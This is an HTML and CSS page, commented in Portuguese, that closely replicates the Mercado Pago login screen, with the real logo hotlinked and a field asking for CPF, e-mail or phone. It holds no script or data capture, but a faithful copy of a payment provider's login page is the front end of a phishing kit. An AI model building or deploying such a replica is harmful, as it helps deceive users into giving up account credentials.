<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <style>
        /* Reset básico */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;  
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Estilo do cabeçalho principal (INTOCADO) */
        .main-header {
            background-color: #ffe600;
            padding: 0 700px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }
        
        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
        .main-content {
            display: flex;
            justify-content: center; 
            align-items: flex-start; 
            padding-top: 80px; 
            gap: 64px;
        }
        
        .left-column {
            display: flex;
            flex-direction: column;
            flex-basis: 320px;
            flex-shrink: 0;
        }

        /* --- AJUSTES FINOS NO TÍTULO --- */
        .main-title {
            font-size: 26px;   /* Um pouco maior */
            font-weight: 600;  /* Mais leve, sem ser negrito */
            color: #333;
            line-height: 1.25; /* Mais compacto */
            text-align: left;
            margin: 0; 
        }
        
        .form-card {
            width: 100%;
            max-width: 480px;
            background-color: #fff;
            box-shadow: 0 2px 6px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 48px;
            box-sizing: border-box;
        }

        /* --- Estilos dos links de suporte --- */
        .security-link {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            padding: 14px 16px;
            text-decoration: none;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            transition: box-shadow 0.2s;
            box-sizing: border-box;
            margin-top: 190px; 
        }

        .security-link:hover {
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
        }

        .security-link .icon-text {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        /* --- AJUSTE FINO NO LINK DE AJUDA --- */
        .help-link {
            display: block;
            margin-top: 16px; /* Espaçamento menor */
            color: #3483fa;
            text-decoration: none;
            font-size: 14px;
            font-weight: 400;
        }
        .help-link:hover { text-decoration: underline; }
        
        /* Outros estilos */
        .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
        .actions { margin-top: 24px; display: flex; align-items: center; gap: 24px; }
        .btn-continue { background-color: #3483fa; color: white; border: none; padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
        .btn-continue:hover { background-color: #2968c8; }
        .link-create { color: #3483fa; font-size: 15px; font-weight: 500; text-decoration: none; }
        .link-create:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <div class="left-column">
            <h1 class="main-title">Digite seu CPF, e-mail ou<br>telefone para iniciar sessão</h1>

            <a href="#" class="security-link">
                <span class="icon-text">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                    <span>Tenho um problema de segurança</span>
                </span>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </a>
    
            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>

        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field">
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="#" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>

    </main>

</body>
</html>